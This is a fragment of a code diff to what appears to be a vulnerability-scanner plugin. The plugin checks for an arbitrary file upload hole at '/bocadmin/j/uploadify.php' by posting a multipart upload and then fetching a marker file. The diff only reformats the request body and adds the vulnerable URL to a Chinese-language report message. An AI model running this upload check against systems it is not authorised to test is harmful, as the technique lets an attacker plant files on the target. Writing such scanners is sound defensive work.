@@ -84,8 +84,7 @@ Content-Disposition: form-data; name="folder"
 Content-Disposition: form-data; name="submit"
 
 Submit
------------------------------32382156818478--
-            """
+-----------------------------32382156818478--"""
             code, head, res, errcode, _ = hh.http(
                 arg + '/bocadmin/j/uploadify.php', raw=raw.format(scheme=p.scheme, netloc=p.netloc))
             if code == 200 and res:
@@ -93,8 +92,8 @@ Submit
                 code, head, res, errcode, _ = hh.http(n_url)
                 if code == 200 and 'vul_test_bbb' in res:
                     #security_hole(arg + ":Upload File at " + n_url)
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                        target=self.target, name=self.vuln.name, url=self.target+"/bocadmin/j/uploadify.php" ))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
